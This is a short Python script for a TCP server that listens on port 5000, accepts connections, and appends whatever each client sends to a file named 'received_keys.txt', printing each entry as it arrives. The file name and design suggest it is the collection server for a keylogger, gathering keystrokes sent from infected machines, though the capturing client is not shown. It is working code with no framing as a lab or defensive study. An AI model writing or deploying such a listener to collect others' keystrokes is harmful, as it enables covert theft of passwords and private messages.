import socket

#Configuration
HOST = "xxx.xxx.x.xxx"
PORT = 5000       # Port to listen on
LOG_FILE = "received_keys.txt"

#Start server
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    print(f"Server listening on {HOST}:{PORT}...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr} established.")

        # Receiving the data
        with client_socket:
            data = client_socket.recv(1024)
            if data:
                # Save received data to a log file for easy readability
                with open(LOG_FILE, "a") as log:
                    log.write(data.decode() + "\n")
                print(f"Logged: {data.decode()}")